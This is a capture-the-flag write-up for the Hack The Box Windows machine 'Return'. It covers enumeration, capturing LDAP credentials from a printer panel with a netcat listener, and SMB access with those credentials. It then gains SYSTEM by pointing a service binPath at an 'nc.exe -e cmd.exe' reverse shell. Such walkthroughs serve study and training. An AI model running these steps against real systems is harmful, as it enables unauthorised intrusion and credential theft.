# Return

---

## Enumeration

- nmap:

```
PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-12 12:14:05Z)
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds?
464/tcp open  kpasswd5?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp open  tcpwrapped
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 19m08s
| smb2-time: 
|   date: 2022-11-12T12:14:15
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
```

- AD Domain: return.local

### Web

- A web server to configure printer device
- Started a nc listener to impersonate an LDAP server to see what's the printer trying to say

---

## Foothold

```zsh
└─$ nc -lvnp 389                      
listening on [any] 389 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.108] 61112
0*`%return\svc-printer�
                       1edFg43012!!

```

- Got printer creds: `svc-printer:1edFg43012!!`

```zsh
crackmapexec smb -u svc-printer -p '1edFg43012!!' --shares $IP
SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
SMB         10.10.11.108    445    PRINTER          [+] Enumerated shares
SMB         10.10.11.108    445    PRINTER          Share           Permissions     Remark
SMB         10.10.11.108    445    PRINTER          -----           -----------     ------
SMB         10.10.11.108    445    PRINTER          ADMIN$          READ            Remote Admin
SMB         10.10.11.108    445    PRINTER          C$              READ,WRITE      Default share
SMB         10.10.11.108    445    PRINTER          IPC$            READ            Remote IPC
SMB         10.10.11.108    445    PRINTER          NETLOGON        READ            Logon server share 
SMB         10.10.11.108    445    PRINTER          SYSVOL          READ            Logon server share
```

- used `evil-winrm` to login in as user svc-printer

---

# Privesc 

- svc-printer is a member of server operators: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators

- This group can start and stop services!

```
*Evil-WinRM* PS C:\Users\svc-printer\Downloads> sc.exe config vss binPath="C:\Users\svc-printer\Downloads\nc.exe -e cmd.exe 10.10.16.2 9000"
[SC] ChangeServiceConfig SUCCESS

-- sc.exe start vss
```

```zsh
└─$ nc -lvnp 9000                            
listening on [any] 9000 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.108] 64280
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```

---
